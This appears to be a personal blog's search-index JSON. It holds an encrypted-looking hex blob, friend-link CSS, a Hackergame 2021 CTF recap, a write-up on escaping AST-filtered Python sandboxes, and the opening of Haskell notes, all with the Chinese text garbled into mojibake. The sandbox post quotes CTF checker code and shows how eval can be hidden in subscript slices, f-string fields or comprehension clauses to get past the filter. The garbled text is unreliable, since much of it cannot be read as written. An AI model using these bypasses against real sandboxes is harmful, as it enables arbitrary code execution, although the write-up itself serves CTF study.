6679e91a98fb9ace86fd1ea43551a95fd478303b14361ed3ebd0097ef3e3781eee9e0d28d152ed5726c0fd3f58b9ec654fc5737b89bb5ee264cf9d1de05bc55cd90458395f4d74a6ff9d5d93df8edf608829e39dbff8bba53d013857d2cb5fa1739047f1714dfc1e7276e1844153918d6a25092354e94febe7d482a5f43788a450e3529689b77210cb191d037cb003a6a361dc30f66f3e44b82e3054bbda58a3cbe7da90181aed4d0a90baf7924cfdd0eebac4648f7aa17c3a9993539f7538fd6a2d3b08235f83d403ee0e76ce6dbc6294632d4464915c54eed96b3098f1135d1be52c3af207c0efe16759643a80f126f92606b63ec4278528677349e5c60b29818736be27c84d6124c44522e35c04ccc620ad6d672cc960dddcfc5f472da78962a75f197db910f54b52c62984a8ecfa9fe20a3a2f9039cc4de6f6fdf0c682e72f98ebc9ef90530a67bfa8f0ad6ac43277fee5a8076dba27811463c5fbae69a4d98a03e663c7c1971b44a3b69c21ae35239b9c6f7f61c3be647052e36dc25b939c1b5b4d542aaf7385880a21620a2895b8b0c891673448973a8776a0ceeff3e1c1c91df5350c389d81aba733be0f0459f8713dce2d1a8ea32ff3bbba024a86c6cf7e7db380449369764a3155feefce5ea4efd360352dcaf49d08efeb2e2b384dd8d3634382a67bb8f3ff0f9a62032e4fa4c9a01ff03d9c34b09078abdeb7ef68cefd1f57d26ae2dd954a556d98241a9bf810fe48650ebffb6be9c78751287760528f150fe1b5dc622fb42fcf922879cac231c25c6e92761cb42723a71ad7d00342692d13e11e044baaa376ab3ec7874f0703d753fc26ac786f77efd63e2ecfc603b65d9b2d8b91184072f9f2cad5cd2e7cc6693deb99eeaea1ca5a399671d56487e94bd873550e92e2e8d678d327362ff2b4d6b4dcca55a57ac83ff9566905a2b4596a2b0d052d98570debf9dd50710bfb8b18958fa6b6a7bbd6d1b917eaf5dc8559a2296144178cb2eded6e0c2132a3eacf327f4b55f4f453e76e51a7e90b5ececdabb03ea05500dde34568bafc457ef1f9637402a8d4759076d1deab3cb67ff64c28b53f2a0e9ff36b565abf86e35839038aee2443482db1dd692b5395c3280997d89622107b5b5fefdb70389260f73ac649c7b300a47fbb2de8e01a9e51d009e0cadf36be18acf734681ac15148f2762cebd4f148f3b42d6b2c9432cbe1671248ee5b2a73ee4349fd00586870b829f446173dc4fc89d004c4daf9b8ecd52cca3e083c868572384f68f22eab6a39326a3fa28c2630972941aaedf661f9d8ed45cf3e6b25f88c5a3ea34a8be5eae4c13a7441a176a772c12562cd3239baf0cd9098a044eb94f02db0df19e8066c9fe185a9113e681b3f40feb4520f23aaecad7912f0730a7a4aa57d929fcd2efb05b3eb0f533bb5485cb4f8df7414f992d76f07779aecf620bcb5e5810d92bd17de96e80421dd2be6c827b9c80b10596fe3ddbc51252ded1e1b0d579b63568046eaf1ad10010e8f7adbf0946c6ef71e18480183f87fb3e30f63b25df34ce2ab11e7e6ccc3004edcbcc32e6c506ef32f04541e83cb2cd3f6ddd49322358a002bbff5009b5e9c7ae49df35e077ac13c25255eba1ef4eadd26752fb32ce090b47f63014ba8c5be439b5b96e34a6ee61477f46cb0255c09894fb0e468b4190de6edd825e3911a8394d7f882ee3885e73d247a8bed0e8684f1854854da6ce246f3baf397cf5417309e857c82e8f3ae9374579ff3ed9b4f2af21e28b7be3f85d28c787a2878adfaed350d902113d1cddc79803cc8b3 æœ‰å¯†ç çš„æ‰å¯ä»¥çœ‹å“¦","link":"/diary/21-oct.html"},{"title":"ç§äººæ—¥è®°","text":"å‰è¨€æ­£ç»äººè°å†™æ—¥è®°å•Šï¼ˆ 2021å¹´ Oct.","link":"/diary/index.html"},{"title":"ã€ŒLearn Haskellã€#1 åŸºç¡€è¯­æ³•ä¸å‡½æ•°","text":"just a test ab","link":"/diary/test.html"},{"title":"å‹é“¾","text":"@media screen and (min-width: 1280px) { .column.is-6-widescreen { flex: none; width: 75%; } } .flink-list { overflow: auto; padding: 10px 10px 0; text-align: center; } .flink-list a { color: #4a4a4a; } [data-theme='dark'] .flink-list a { color: rgba(255,255,255,0.7) } .flink-list-item { position: relative; float: left; overflow: hidden; margin: 15px 7px; width: calc(100% / 3 - 15px); height: 90px; border-radius: 8px; line-height: 17px; -webkit-transform: translateZ(0); transition: 0.25s; } .flink-item-icon { float: left; overflow: hidden; margin: 15px 10px; width: 60px; height: 60px; border-radius: 35px; } .flink-item-name { padding: 16px 10px 0 0; height: 40px; font-weight: bold; font-size: 1.43em; } .flink-item-desc { padding: 16px 10px 16px 0; height: 50px; font-size: 0.93em; } .flink-list-item:hover { background-color: #81ACF9; } @media screen and (max-width: 1280px) { .flink-list-item { width: calc(50% - 15px) !important; } } @media screen and (max-width: 810px) { .flink-list-item { width: calc(100% - 15px) !important; } } GZTime Walking on the Time Axis. Cigar666 _(:Ğ·ã€âˆ )_ èŒƒæ»‡ä¸œ |ï½¥Ï‰ï½¥ï½€) yyy2015c01 æ­ªæ­ªæ­ªæ­ªæ­ªæ­ªæ­ªæ­ªæ­ª widcardw ä¸æ˜¯å¤šé¢æ‰‹ çƒ§é£ A human. æ•¸å¿ƒ è¬ç‰©çš†æ•¸. ç›¸å…³é“¾æ¥ MKå®˜ç½‘ manim-kindergartenå®˜ç½‘","link":"/friends/index.html"}],"posts":[{"title":"ã€ŒHackergame 2021ã€#0 èµ›åæ€»ç»“","text":"ä¸ƒå¤©ç´§å¼ åˆºæ¿€ç ´é˜²çš„ Hackergame 2021 ç»ˆäºç»“æŸäº†_(:Ğ·ã€âˆ )_åœ¨è¿™ä¸¢ä¸€ä¸ªæ€»ç»“å’Œ Writeup é“¾æ¥ã€‚ Writeup ã€ŒHackergame 2021ã€#1 Writup å¼€å±€ä¸Šåˆ†ç¯‡ 0 ç­¾åˆ°ã€åå…­è¿›åˆ¶ã€ç”µæ³¢ã€çŒ«å’ªé—®ç­”ã€å–ç“œã€é€æ˜æ–‡ä»¶ã€æ—…è¡Œç…§ç‰‡ ã€ŒHackergame 2021ã€#2 Writup å¼€å±€ä¸Šåˆ†ç¯‡ 1 å¤§ç åˆ€ã€å›¾ä¹‹ä¸Šã€èµ›åšå¨æˆ¿01ã€åŠ©è®°è¯1ã€pğŸ˜­q ã€ŒHackergame 2021ã€#3 Writup æŒç»­ç ´é˜²ç¯‡ 0 Amnesia1ã€RSAã€LUKSã€MicroWorld ã€ŒHackergame 2021ã€#4 Writup æŒç»­ç ´é˜²ç¯‡ 1 é˜µåˆ—æ¢å¤ã€é©¬èµ›å…‹ã€minecRaftã€å¯†ç ç”Ÿæˆå™¨ Summaryç¬¬ä¸€æ¬¡å‚åŠ  Hackergameï¼Œå¤§æ¦‚ä¹Ÿç®—æ˜¯ç¬¬ä¸€æ¬¡å‚åŠ æ¯”è¾ƒæ­£å¼çš„ CTF æ¯”èµ›ã€‚ è¿™æ¬¡çš„æ—¶é—´ä¹Ÿæ¯”è¾ƒéš¾å—ï¼Œ10æœˆ23æ—¥å¼€å§‹ï¼Œç„¶è€Œå½“å¤©æœ‰ç®¡ä¹å›¢éŸ³ä¹ä¼šæ¼”å‡ºï¼Œè¦å…¨å¤©æ’ç»ƒã€‚24å·å»å¬äº†å¸ç–å®¤å†…ä¹å›¢çš„éŸ³ä¹ä¼šã€‚å‰©ä¸‹å·¥ä½œæ—¥çš„æ—¶é—´ä¹Ÿè¦ä¸Šè¯¾ï¼Œè¿˜è¦å¤ï¼ˆé¢„ï¼‰ä¹ å°æµ‹ã€‚ä½†è¿˜æ˜¯æŠ½å‡ºå¾ˆé•¿æ—¶é—´æ¥æ‰“äº† Hackergameã€‚ ç»è¿‡ä¸ƒå¤©ï¼Œæ‹¿åˆ°äº†æµ™å¤§ç»„å†…ç¬¬ä¸‰ã€æ€»æ’è¡Œç¬¬äºŒåäºŒçš„æˆç»©æ€»ä¹‹ï¼Œéå¸¸æ„Ÿè°¢é¼“åŠ±æˆ‘ï¼ˆæ‹‰å…¥å‘ï¼‰çš„ GZTimeï¼Œæ„Ÿè°¢ä¸€ç›´ä¸Šåˆ†çš„ yyy å¤§ä½¬å’Œ Cage å­¦é•¿ç£ä¿ƒæˆ‘ç»§ç»­åšé¢˜ï¼ˆåˆ«å·å•¦ï¼‰ï¼Œæ„Ÿè°¢çº³æ–°ç¾¤é‡Œæ´»è·ƒæ°”æ°›çš„å­¦é•¿ï¼ˆä¸æ„Ÿè°¢è†œï¼‰ï¼Œæ„Ÿè°¢å®¹å¿æˆ‘å‡Œæ™¨ä¸€ä¸¤ç‚¹åœ¨å¯å®¤åšé¢˜ã€ç¬¬äºŒå¤©æ—©ä¸Šè¢«ä¸€å †é—¹é“ƒåµé†’çš„å®¤å‹ï¼Œè¿˜è¦æ„Ÿè°¢æ²¡å‚åŠ æ¯”èµ›æ¥æš´è™æˆ‘çš„å›¾çµå¤§ä½¬ä»¬ï¼ˆï¼‰ å¼€èµ›çš„æ—¶å€™åˆšå¥½ä¹å›¢ä¸­åˆä¼‘æ¯ï¼Œäºæ˜¯åœ¨ä¼‘æ¯å®¤åšäº†å‡ é“é¢˜ï¼Œæ¥ç€ä¸€ä¸¤å¤©é™†ç»­æŠŠä¼šçš„æœ‰æ€è·¯çš„é¢˜åšäº†ã€‚ç„¶åå°±å¼€å§‹äº†ç ´é˜²é˜¶æ®µï¼ˆï¼‰ä¸€æ¯èŒ¶ï¼Œä¸€åŒ…çƒŸï¼Œä¸€é“é¢˜ç›®åšä¸€å¤©ï¼ˆxåŸºæœ¬ä¸Šæ¯å¤©é™¤äº†ä¸Šè¯¾å†™ä½œä¸šçš„æ‰€æœ‰æ—¶é—´éƒ½æ¥æ‰“ hackergame äº†ï¼ˆä¸­é—´åšé©¬èµ›å…‹ç ´é˜²çš„å¤œæ™šå‡ºå»é—²é€›äº†ä¸¤ä¸ªå°æ—¶ï¼‰ æ€»ä¹‹æˆ‘ä¹Ÿæ‰å¤§ä¸€ï¼Œåˆšæ¥è§¦ CTF ä¸€ä¸ªå¤šæœˆï¼Œè¿™æ¬¡æ‰“å¾—ä¹ŸæŒºçˆ½ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½å€Ÿæ­¤æ··è¿› AAAï¼ˆé€ƒ ä½“éªŒè‰¯å¥½ï¼Œä½†ä¸å®Œå…¨è‰¯å¥½ï¼Œä¸‹æ¬¡å†æ¥_(:Ğ·ã€âˆ )_ å£°æ˜ï¼šè™½ç„¶æ€»ç»“å’Œ Writeup çš„åˆ›å»ºæ—¶é—´åœ¨æ¯”èµ›ç»“æŸå‰ï¼Œä½†å‡åœ¨æ¯”èµ›ç»“æŸåæ‰å‘å¸ƒåˆ°äº’è”ç½‘","link":"/p/c05d7b7c.html"},{"title":"ç»•è¿‡ASTè§£æçš„pythonæ²™ç®±é€ƒé€¸æ–¹æ³•","text":"è¿™ç±»é¢˜æ˜¯åœ¨zjusec.comä¸Š ACTF 2019 åˆ†ç»„ä¸­chenyuanå‡ºçš„ä¸€ç³»åˆ—pythonæ²™ç®±é€ƒé€¸é¢˜ç›®ä¸­çœ‹åˆ°çš„åœ¨ç½‘ä¸Šæœç´¢è²Œä¼¼ä¹Ÿåªèƒ½æœåˆ° TokyoWesterns CTF 4th 2018 è¿™ä¸€æ¬¡æ¯”èµ›ä¸­çš„é¢˜ç›® ç®€ä»‹è¿™ç±»é¢˜ç›®ä¸åƒæ™®é€šçš„æ²™ç®±é€ƒé€¸ä¸€æ ·é€šè¿‡åˆ é™¤å†…ç½®å‡½æ•°å­—å…¸æˆ–è€…åˆ é™¤æŸäº›æ¨¡å—çš„å†…å®¹æ¥å®ç°è€Œæ˜¯åœ¨è¾“å…¥å‘½ä»¤åå³ä½¿ç”¨pythonçš„ ast æ¨¡å—å¯¹å…¶è¿›è¡Œè¯­æ³•åˆ†æï¼Œåªè¦ä½¿ç”¨äº†æŸäº›ç¦æ­¢çš„æŠ½è±¡è¯­æ³•ï¼Œå°±æŠ›å‡ºå¼‚å¸¸å¯¼è‡´ç¨‹åºä¸­æ–­ å› ä¸ºå®ƒç›´æ¥ä½¿ç”¨ ast.parse åˆ†æäº†è¯­æ³•ï¼Œæ‰€ä»¥å¾ˆéš¾è’™æ··è¿‡å…³éª—è¿‡ astï¼Œè¿™æ—¶å°±éœ€è¦å¯»æ‰¾é¢˜ç›®ä¸­éå†è¯­æ³•æ ‘çš„æ¼æ´äº† é¢˜ç›®åˆ†æå…ˆæ¥çœ‹çœ‹cyçš„pysandbox13ï¼Œè¿™ä¸ªæœ€ç»ˆç‰ˆçš„ASTæ£€æŸ¥ç»•è¿‡ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112dbgprint = sys.stderr.writeclass Traversal(): def __init__(self, node): self.tisiv(node) depth = -1 def tisiv(self, nodes): if not isinstance(nodes, list): nodes = [nodes] self.depth += 1 for node in nodes: func = getattr(self, 'tisiv_' + node.__class__.__name__, None) if func: dbgprint(&quot; &quot;*self.depth + &quot;tisiv&quot;[::-1] +&quot;\\t&quot;+ node.__class__.__name__+&quot;\\n&quot;) return func(node) else: if not isinstance(node, ast.expr): raise Exception(&quot;not allowed &quot;+str(node)) self.depth -= 1 def tisiv_Call(self, node): raise Exception(&quot;not allowed&quot;) self.tisiv(node.func) self.tisiv(node.args) self.tisiv(node.keywords) def tisiv_Attribute(self, node): raise Exception(&quot;not allowed&quot;) self.tisiv(node.value) self.tisiv(node.attr) self.tisiv(node.ctx) def tisiv_Import(self, node): raise Exception(&quot;not allowed&quot;) def tisiv_Module(self, node): self.tisiv(node.body) def tisiv_BoolOp(self, node): self.tisiv(node.values) def tisiv_BinOp(self, node): self.tisiv(node.left) self.tisiv(node.right) def tisiv_UnaryOp(self, node): self.tisiv(node.operand) def tisiv_Lambda(self, node): self.tisiv(node.body) self.tisiv(node.args) def tisiv_IfExp(self, node): self.tisiv(node.test) self.tisiv(node.body) self.tisiv(node.orelse) def tisiv_Dict(self, node): self.tisiv(node.keys) self.tisiv(node.values) def tisiv_Set(self, node): self.tisiv(node.elts) def tisiv_ListComp(self, node): self.tisiv(node.elt) self.tisiv(node.generators) def tisiv_SetComp(self, node): self.tisiv(node.elt) self.tisiv(node.generators) def tisiv_DictComp(self, node): self.tisiv(node.key) self.tisiv(node.value) self.tisiv(node.generators) def tisiv_GeneratorExp(self, node): self.tisiv(node.elt) self.tisiv(node.generators) def tisiv_Yield(self, node): self.tisiv(node.value) def tisiv_Compare(self, node): self.tisiv(node.left) self.tisiv(node.comparators) def tisiv_Repr(self, node): self.tisiv(node.value) def tisiv_Subscript(self, node): self.tisiv(node.value) self.tisiv(node.slice) def tisiv_List(self, node): self.tisiv(node.elts) def tisiv_Tuple(self, node): self.tisiv(node.elts) def tisiv_Expr(self, node): self.tisiv(node.value) def tisiv_JoinedStr(self, node): self.tisiv(node.values) def tisiv_NameConstant(self, node): passTraversal(ast.parse(c)) å¯ä»¥è¯»å‡ºï¼Œå®ƒå®šä¹‰äº†ä¸€ä¸ª Traversal ç±»ï¼Œåœ¨åˆå§‹åŒ–çš„æ—¶å€™å¯¹ä¼ å…¥çš„èŠ‚ç‚¹è°ƒç”¨ tisiv æ–¹æ³•ï¼Œå³å¯¹å…¶æ‰€æœ‰å­èŠ‚ç‚¹ç»§ç»­é€å±‚æ£€æŸ¥å¦‚æœ tisiv_{è¯¥èŠ‚ç‚¹ç±»å} å·²ç»æœ‰äº†å­˜åœ¨çš„æ–¹æ³•ï¼Œå°±è°ƒç”¨å®ƒï¼Œåœ¨é‚£äº›æ–¹æ³•ä¸­åˆåˆ†åˆ«å¯¹å…¶å­èŠ‚ç‚¹è¿›è¡Œäº†æ£€æŸ¥å¦‚æœä¸å­˜åœ¨è¿™æ ·çš„æ–¹æ³•ï¼Œå°±æ£€æµ‹è¿™ä¸ªèŠ‚ç‚¹çš„è¯­æ³•ç±»å‹æ˜¯ä¸æ˜¯ ast.exprï¼Œå¦‚æœä¸æ˜¯å°±ç›´æ¥ç¦æ­¢ å†çœ‹ TokyoWesterns CTF 4th 2018 è¿™é“é¢˜ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940def check(node): if isinstance(node, list): return all([check(n) for n in node]) else: attributes = { 'BoolOp': ['values'], 'BinOp': ['left', 'right'], 'UnaryOp': ['operand'], 'Lambda': ['body'], 'IfExp': ['test', 'body', 'orelse'], 'Dict': ['keys', 'values'], 'Set': ['elts'], 'ListComp': ['elt', 'generators'], 'SetComp': ['elt', 'generators'], 'DictComp': ['key', 'value', 'generators'], 'GeneratorExp': ['elt', 'generators'], 'Yield': ['value'], 'Compare': ['left', 'comparators'], 'Call': False, # call is not permitted 'Repr': ['value'], 'Num': True, 'Str': True, 'Attribute': False, # attribute is also not permitted 'Subscript': ['value'], 'Name': True, 'List': ['elts'], 'Tuple': ['elts'], 'Expr': ['value'], # root node 'comprehension': ['target', 'iter', 'ifs'], } for k, v in attributes.items(): if hasattr(ast, k) and isinstance(node, getattr(ast, k)): if isinstance(v, bool): return v return all([check(getattr(node, attr)) for attr in v])if __name__ == '__main__': expr = sys.stdin.readline() body = ast.parse(expr).body è¿™é“é¢˜ç›®çš„ä»£ç å°±æ›´åŠ æ˜ç¡®äº†ï¼Œé“ç†æ˜¯ç±»ä¼¼çš„ ç»•è¿‡è¯­æ³•æ ‘æ£€æŸ¥æ­£å¦‚å‰é¢è¯´çš„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾æ£€æŸ¥ç¨‹åºä¸­çš„æ¼æ´ å¯»æ‰¾æ²¡æœ‰éå†åˆ°çš„å­èŠ‚ç‚¹æˆ‘ä»¬å‘ç°ï¼Œåœ¨é¢˜ç›®çš„ç¨‹åºä¸­ï¼Œéƒ½æ˜¯æ‰‹åŠ¨ç¼–å†™äº†å¯¹æŸä¸ªæŠ½è±¡è¯­æ³•çš„å“ªäº›éƒ¨åˆ†è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥å¯èƒ½å°±ä¼šå‡ºç°æŸä¸ªè¯­æ³•çš„æŸä¸ªéƒ¨åˆ†æ²¡è¢«æ£€æµ‹åˆ°çš„æƒ…å†µã€‚ è¿™æ—¶å€™å°±å¯ä»¥å»å’Œ ASTæ–‡æ¡£ä¸­æŠ½è±¡è¯­æ³• å¯¹æ¯”ï¼Œæ–‡æ¡£ä¸­ç»™å‡ºçš„ ast.expr åŒ…å«äº†ï¼š 12345678910111213141516171819202122232425262728293031323334expr = BoolOp(boolop op, expr* values) | NamedExpr(expr target, expr value) | BinOp(expr left, operator op, expr right) | UnaryOp(unaryop op, expr operand) | Lambda(arguments args, expr body) | IfExp(expr test, expr body, expr orelse) | Dict(expr* keys, expr* values) | Set(expr* elts) | ListComp(expr elt, comprehension* generators) | SetComp(expr elt, comprehension* generators) | DictComp(expr key, expr value, comprehension* generators) | GeneratorExp(expr elt, comprehension* generators) -- the grammar constrains where yield expressions can occur | Await(expr value) | Yield(expr? value) | YieldFrom(expr value) -- need sequences for compare to distinguish between -- x &lt; 4 &lt; 3 and (x &lt; 4) &lt; 3 | Compare(expr left, cmpop* ops, expr* comparators) | Call(expr func, expr* args, keyword* keywords) | FormattedValue(expr value, int? conversion, expr? format_spec) | JoinedStr(expr* values) | Constant(constant value, string? kind) -- the following expression can appear in assignment context | Attribute(expr value, identifier attr, expr_context ctx) | Subscript(expr value, expr slice, expr_context ctx) | Starred(expr value, expr_context ctx) | Name(identifier id, expr_context ctx) | List(expr* elts, expr_context ctx) | Tuple(expr* elts, expr_context ctx) -- can appear only in Subscript | Slice(expr? lower, expr? upper, expr? step) æ¯”å¦‚ï¼ŒBinOp(expr left, operator op, expr right) è¡¨ç¤ºäº†äºŒå…ƒè¿ç®—è¿™ä¸ªè¯­æ³•ï¼Œleft è¡¨ç¤ºå·¦ä¾§çš„è¡¨è¾¾å¼ï¼Œop è¡¨ç¤ºäºŒå…ƒè¿ç®—ç¬¦ï¼Œright è¡¨ç¤ºå³ä¾§è¡¨è¾¾å¼ã€‚åŒç† ListComp(expr elt, comprehension* generators) ä¸­ elt è¡¨ç¤ºå…¶ä¸­åˆ—è¡¨æ¨å¯¼çš„å…ƒç´ ï¼Œè€Œ generator åˆ™è¡¨ç¤ºç”Ÿæˆå™¨å­å¥ å†æ¥çœ‹ TWCTF è¿™é“é¢˜ï¼Œå®ƒçš„æ£€æŸ¥ä¸­å†™äº†ï¼š 1'Subscript': ['value'], è€Œæ–‡æ¡£ä¸­ç»™çš„ç´¢å¼•è®¿é—®æ˜¯ Subscript(expr value, expr slice, expr_context ctx) å› æ­¤å¯ä»¥å‘ç°ç¨‹åºå¹¶æ²¡æœ‰æ£€æµ‹ç´¢å¼•è®¿é—®ä¸­çš„åˆ‡ç‰‡ sliceï¼Œè¿™æ ·ä¾‹å¦‚ a[â€¦] ä¸­çš„ â€¦ éƒ¨åˆ†å°±ä¼šè¢«å…¨éƒ¨å¿½ç•¥æ‰€ä»¥å°±å¯ä»¥åœ¨[]ä¸­è—ä¸€ä¸ªevalæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„åŠŸèƒ½ å¯»æ‰¾æ²¡æœ‰æ£€æŸ¥çš„èŠ‚ç‚¹å†æ¥çœ‹ zjusec è¿™é“é¢˜ï¼Œé€šè¿‡å¯¹æ¯”å¯ä»¥å‘ç°æ‰€æœ‰æ£€æµ‹çš„èŠ‚ç‚¹çš„å­èŠ‚ç‚¹ä¹Ÿéƒ½éå†äº†ä½†æ˜¯å†ç»†çœ‹å¯ä»¥å‘ç° FormattedValue è¿™ä¸ªèŠ‚ç‚¹å¹¶æ²¡æœ‰åœ¨é¢˜ç›®ä»£ç é‡Œå‡ºç° è€Œä¸” ast.FormattedValue å±äº ast.exprï¼Œæ‰€ä»¥å®ƒæ—¢ä¸ä¼šè¢«æ£€æŸ¥ï¼Œä¹Ÿä¸ä¼šæŠ›å‡ºå¼‚å¸¸çœ‹åå­—åƒæ˜¯ f-string ç›¸å…³ï¼Œå¯ä»¥ dump ä¸€ä¸‹çœ‹çœ‹ï¼š 12&gt;&gt;&gt; ast.dump(ast.parse(&quot;f'{x}'&quot;))&quot;Module(body=[Expr(value=JoinedStr(values=[FormattedValue(value=Name(id='x', ctx=Load()), conversion=-1, format_spec=None)]))], type_ignores=[])&quot; å¯ä»¥å‘ç°ï¼Œf-string æ˜¯ JoinedStrï¼Œè€Œ FormattedValue æ˜¯å…¶ä¸­è¢«æ ¼å¼åŒ–çš„éƒ¨åˆ† æ‰€ä»¥å°±å¯ä»¥å‘ f-string çš„ {} éƒ¨åˆ†è— eval æ¥å¹²åäº‹äº† å…¶ä»–æ¼æ´è¿™ä¸ªæ˜¯ pysandbox12 çš„ä¸€ç§è§£æ³•pythonä¸­çš„è¯­æ³•ä¸ä»…æœ‰ ast.expr ä¸€ç§ï¼Œè€Œä¸”å¾ˆç‰¹åˆ«çš„æ˜¯ï¼Œåˆ—è¡¨æ¨å¯¼ ListComp çš„ç”Ÿæˆå™¨å­å¥å¹¶ä¸æ˜¯ ast.exprï¼Œè€Œæ˜¯ ast.comprehension 12&gt;&gt;&gt; ast.dump(ast.parse(&quot;[x for x in range(n)]&quot;))&quot;Module(body=[Expr(value=ListComp(elt=Name(id='x', ctx=Load()), generators=[comprehension(target=Name(id='x', ctx=Store()), iter=Call(func=Name(id='range', ctx=Load()), args=[Name(id='n', ctx=Load())], keywords=[]), ifs=[], is_async=0)]))], type_ignores=[])&quot; ä½†æ˜¯ pysandbox13 è¿™æ ·æ’é™¤äº† ast.expr ï¼š 12if not isinstance(node, ast.expr): raise Exception(&quot;not allowed &quot;+str(node)) ä½†æ˜¯12é¢˜ä¸­å¹¶æ²¡æœ‰ï¼Œæ‰€ä»¥ ast.comprehension è¿™ä¸ªç±»å‹å®Œå…¨æ²¡æœ‰è¢«æ£€æŸ¥å› æ­¤ç›´æ¥å‘ç”Ÿæˆå™¨è¡¨è¾¾å¼ä¸­æ’å…¥åä¸œè¥¿å³å¯ï¼š [x for x in [eval(...)]] Reference TokyoWesterns CTF 4th 2018 Writeup â€” Part 5 Documentation of ast","link":"/p/6dee32d5.html"},{"title":"ã€ŒLearn Haskellã€#0 æ€»ç« ","text":"å­¦ä¹ ä¸€é—¨æ–°è¯­è¨€ä¹‹Haskell å‰è¨€ä¹‹å‰ä¸€ç›´å¾ˆå¥½å¥‡å‡½æ•°å¼ç¼–ç¨‹ï¼Œè§‰å¾—HaskellæŒºæœ‰æ„æ€çš„ï¼Œæƒ³å­¦å­¦ç°åœ¨é«˜è€ƒå®Œæ”¾å‡äº†ï¼Œå¯ä»¥æœ‰æ—¶é—´å…·ä½“å­¦ä¸€å­¦äº†è¿™é‡Œæ²¡æœ‰Haskellçš„æ•™ç¨‹ï¼Œåªæœ‰æˆ‘åœ¨å­¦ä¹ Haskellæ—¶å†™ä¸‹çš„ç¬”è®° ç›®å½• #0&nbsp;|&nbsp;æ€»ç« &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;#1&nbsp;|&nbsp;åŸºç¡€è¯­æ³•ä¸å‡½æ•°&emsp;&emsp;&emsp;#2&nbsp;|&nbsp;é«˜é˜¶å‡½æ•°ä¸æ¨¡å—&emsp;&emsp;&emsp;#3&nbsp;|&nbsp;ç±»å‹ä¸ç±»å‹ç±»&emsp;&emsp;&emsp;&emsp;#4&nbsp;|&nbsp;è¾“å…¥è¾“å‡ºä¸æ–‡ä»¶&emsp;&emsp;&emsp;#5&nbsp;|&nbsp;å‡½å­ã€åº”ç”¨å‡½å­ä¸å•å­#6&nbsp;|&nbsp;åŠç¾¤ä¸å¹ºåŠç¾¤&emsp;&emsp;&emsp;&emsp;#7&nbsp;|&nbsp;ä¸€äº›å…¶å®ƒç±»å‹ç±»&emsp;&emsp;&emsp;#A&nbsp;|&nbsp;Haskellä¸èŒƒç•´è®º&emsp;&nbsp;&thinsp; åŸºç¡€è¿ç®— + - * / ()ï¼šåŠ å‡ä¹˜é™¤ divï¼šæ•´é™¤ modï¼šå–æ¨¡ True Falseï¼šå¸ƒå°”å€¼ || &amp;&amp; notï¼šæˆ–ä¸”é ==ï¼šæ¡ä»¶åˆ¤æ–­ï¼Œç›¸ç­‰ /=ï¼šæ¡ä»¶åˆ¤æ–­ï¼Œä¸ç­‰ å‡½æ•°è°ƒç”¨Haskellä¸­è°ƒç”¨å‡½æ•°ä¸åŠ æ‹¬å·ï¼Œå…ˆå†™å‡ºå‡½æ•°åï¼Œç„¶åé€ä¸ªåˆ—å‡ºå‚æ•°ï¼Œç”¨ç©ºæ ¼éš”å¼€ï¼š 12ghci&gt; max 1 22 å‰ç¼€ï¼ˆprefixï¼‰å‡½æ•°ä¸ä¸­ç¼€ï¼ˆinfixï¼‰å‡½æ•°è½¬æ¢ï¼š å¯¹å‰ç¼€å‡½æ•°åŠ ``ä½¿å…¶å˜æˆä¸­ç¼€å‡½æ•° å¯¹ä¸­ç¼€å‡½æ•°åŠ ()ä½¿å…¶å˜æˆå‰ç¼€å‡½æ•° 12345678ghci&gt; 4 `div` 22ghci&gt; 1 `max` 22ghci&gt; (+) 1 23ghci&gt; (||) True FalseTrue Liståˆ—è¡¨æ˜¯Haskellä¸­å¾ˆå¸¸è§çš„æ•°æ®ç±»å‹ï¼Œå’ŒPythonä¸­ä¸åŒï¼ŒHaskellä¸­çš„åˆ—è¡¨ä¸­çš„æ‰€æœ‰å…ƒç´ å¿…é¡»æ˜¯åŒä¸€ä¸ªç±»å‹ã€‚ ä»¥ä¸‹æ˜¯åˆ—è¡¨å¸¸ç”¨çš„å‡½æ•°ï¼š (++) :: [a] -&gt; [a] -&gt; [a]ï¼šåˆå¹¶ä¸¤ä¸ªåˆ—è¡¨ (:) :: a -&gt; [a] -&gt; [a]ï¼šå°†å•ä¸ªå…ƒç´ å¹¶å…¥åˆ—è¡¨ã€‚[1, 2, 3]æ˜¯1:2:3:[]çš„è¯­æ³•ç³– (!!) :: [a] -&gt; Int -&gt; aï¼šé€šè¿‡ç´¢å¼•å–å‡ºæŸä¸ªä½ç½®ä¸Šçš„å…ƒç´ ã€‚a !! 1ç›¸å½“äºPythonä¸­çš„a[1] head :: [a] -&gt; aï¼šè¿”å›åˆ—è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´  tail :: [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨ä¸­é™¤å»ç¬¬ä¸€ä¸ªå…ƒç´ åçš„åˆ—è¡¨ï¼ˆè‹¥åªæœ‰ä¸€ä¸ªå…ƒç´ åˆ™è¿”å›ç©ºåˆ—è¡¨[]ï¼‰ last :: [a] -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´  init :: [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨ä¸­é™¤å»æœ€åä¸€ä¸ªå…ƒç´ åçš„åˆ—è¡¨ length :: Foldable t =&gt; t a -&gt; Intï¼šè¿”å›åˆ—è¡¨çš„é•¿åº¦ null :: Foldable t =&gt; t a -&gt; Boolï¼šè¿”å›åˆ—è¡¨æ˜¯å¦ä¸ºç©º reverse :: [a] -&gt; [a]ï¼šè¿”å›ç¿»è½¬åçš„åˆ—è¡¨ take :: Int -&gt; [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨açš„å‰nä¸ªå…ƒç´ çš„åˆ—è¡¨(take n a) drop :: Int -&gt; [a] -&gt; [a]ï¼šè¿”å›åˆ—è¡¨aä¸­é™¤å»å‰nä¸ªå…ƒç´ åçš„åˆ—è¡¨(drop n a) maximum :: (Foldable t, Ord a) =&gt; t a -&gt; aï¼šè¿”å›åˆ—è¡¨ä¸­çš„æœ€å¤§å€¼ minimum :: (Foldable t, Ord a) =&gt; t a -&gt; 